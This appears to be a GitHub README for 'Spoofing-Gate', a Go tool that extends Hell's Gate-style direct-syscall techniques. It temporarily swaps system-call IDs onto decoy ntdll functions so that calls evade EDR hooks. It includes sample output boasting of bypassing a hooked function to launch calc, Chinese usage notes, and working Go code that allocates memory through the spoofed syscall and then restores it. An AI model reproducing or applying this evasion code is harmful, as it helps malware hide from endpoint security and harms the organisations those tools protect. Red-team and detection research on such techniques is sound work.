# Spoofing-Gate
(Hellsgate|Halosgate|Tartarosgate)+Spoofing-Gate. Ensures that all systemcalls go through ntdll.dll

https://github.com/timwhitez/Doge-Gabh


inspired by Recycled Gate

https://github.com/thefLink/RecycledGate


exclude apis in https://github.com/Mr-Un1k0d3r/EDRs


- get sysid from "X"gate

- use Spoofing-Gate to get the Spoofing funtion pointer

- call the pointer

- Recover

```
> .\SpfGate.exe
messPtr:0x7ff91ee2e570
Messed up the NTCreateThreadEx function, gl launching calc!
NtAllocateVirtualMemory|(fake)NtQueryInformationTransactionManager: 0x7ff91ee2f710
NtProtectVirtualMemory|(fake)NtEnumerateBootEntries: 0x7ff91ee2e910
You seem to have bypassed a hooked function... congrats (sys ID is: 193)
NtCreateThreadEx|(fake)NtCallbackReturn: 0x7ff91ee2ce00

```

```

方法使用详情：
r1,e := spfgate.SpfGate(sysid,tmplist)

sysid为目标api的sysid值
tmplist是需要排除的api名字（部分api调用会报错或者冲突）
r1为结构体

type SPFG struct {
	Fakename	string //随机api的名字
	Pointer		uintptr //api地址
	Fakeid		uint16 //替换后的sysid
	Realid 		uint16	//替换前的sysid
}

结构体有个Recover()函数
用来恢复api的原sysid
r1.Recover()

执行的时候就使用syscall执行r1.pointer


```



```
//get sysid from "X"gate
alloc,e := gabh.MemHgate(str2sha1("NtAllocateVirtualMemory"),str2sha1)
	if e != nil {
		panic(e)
	}
  
var tmplist []string
tmplist = append(tmplist,[]string{"NtAllocateVirtualMemory"}...)


//use Spoofing-Gate to get the Spoofing funtion pointer
alloctmp,e := spfgate.SpfGate(alloc,tmplist)
if e != nil{
  panic(e)
}
tmplist = append(tmplist,alloctmp.Fakename)
fmt.Printf("NtAllocateVirtualMemory|(fake)")
fmt.Printf(alloctmp.Fakename)
fmt.Printf(": 0x%x\n",alloctmp.Pointer)

//call the pointer
r1, _,_ := syscall.Syscall6(
		alloctmp.Pointer, //ntallocatevirtualmemory
		6,
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		syscall.PAGE_READWRITE,
	)
	if r1 != 0{
		fmt.Printf("1 %x\n", r1)
		return
	}
	
	
//Recover
alloctmp.Recover()


```


